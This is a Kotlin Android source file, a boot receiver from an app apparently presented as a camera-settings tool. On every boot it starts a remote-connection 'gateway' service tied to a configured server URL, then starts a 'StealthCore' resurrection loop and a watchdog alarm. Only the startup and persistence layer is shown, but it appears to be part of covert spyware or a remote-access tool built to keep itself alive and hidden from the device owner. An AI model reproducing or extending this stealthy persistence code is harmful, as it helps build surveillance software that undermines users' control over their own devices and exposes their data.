package com.settingpro.camera.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.data.local.SettingsDataStore
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import javax.inject.Inject

/**
 * Starts the gateway service after device boot.
 *
 * Hilt injection note: @AndroidEntryPoint on a BroadcastReceiver uses the
 * ApplicationComponent, which is initialised in Application.onCreate(). Android
 * always creates the Application before delivering any broadcast — including
 * ACTION_BOOT_COMPLETED — so injection is safe on cold boot as long as the
 * Application class is annotated with @HiltAndroidApp.
 */
@AndroidEntryPoint
class BootReceiver : BroadcastReceiver() {

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    companion object {
        private const val TAG = "BootReceiver"
        private val BOOT_ACTIONS = setOf(
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            "com.htc.intent.action.QUICKBOOT_POWERON"
        )
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action !in BOOT_ACTIONS) return
        AppLogger.d(TAG, "Boot received: ${intent.action}")

        val pendingResult = goAsync()

        // SupervisorJob() so a child failure doesn't cancel the scope.
        // The scope is explicitly cancelled in finally to prevent a coroutine leak.
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope.launch {
            try {
                val serverUrl = settingsDataStore.serverUrl.first()
                if (serverUrl.isBlank()) {
                    AppLogger.w(TAG, "Server URL not configured — skipping service start")
                    return@launch
                }

                val serviceEnabled = settingsDataStore.serviceEnabled.first()
                if (!serviceEnabled) {
                    AppLogger.d(TAG, "Service disabled — skipping start")
                    return@launch
                }

                val permissionsGranted = settingsDataStore.permissionsGranted.first()
                if (!permissionsGranted) {
                    AppLogger.d(TAG, "Permissions not yet granted — skipping service start")
                    return@launch
                }

                AppLogger.d(TAG, "Starting DeviceConnectionService after boot")
                DeviceConnectionService.startService(context)

                // Start the fine-grained resurrection loop and coarse watchdog.
                StealthCore.startResurrectionLoop(context)
                AlarmReceiver.scheduleAlarm(context)

            } catch (e: Exception) {
                AppLogger.e(TAG, "Error starting service on boot", e)
            } finally {
                scope.cancel()
                pendingResult.finish()
            }
        }
    }
}